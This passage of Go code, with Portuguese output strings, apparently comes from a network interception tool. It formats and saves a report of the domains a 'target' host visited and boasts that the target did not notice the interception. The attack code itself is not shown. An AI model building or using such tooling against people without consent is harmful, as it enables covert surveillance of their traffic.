	if accesses, ok := logs.HostAccesses[targetIP]; ok && len(accesses) > 0 {
		sb.WriteString("\n  Destinos Acessados pelo Alvo:\n")
		type domainCount struct {
			domain string
			count  int
		}
		var sortedAccesses []domainCount
		for dom, count := range accesses {
			sortedAccesses = append(sortedAccesses, domainCount{dom, count})
		}
		sort.Slice(sortedAccesses, func(i, j int) bool {
			return sortedAccesses[i].count > sortedAccesses[j].count
		})
		for _, entry := range sortedAccesses {
			sb.WriteString(fmt.Sprintf("      * %-50s (%d acessos)\n", entry.domain, entry.count))
		}
	} else {
		sb.WriteString("\n  Nenhum destino capturado durante a interceptação.\n")
	}

	sb.WriteString("=========================================================================\n")
	sb.WriteString("  [✓] Rede restaurada com sucesso. O alvo não percebeu a interceptação.\n\n")

	// Imprime no console
	fmt.Print(sb.String())

	// Salva no arquivo log_ip.txt (centralizado — único ponto de gravação)
	reporter := report.NewFileWriter()
	_ = reporter.SaveReport("log_ip.txt", sb.String())

	return nil
}
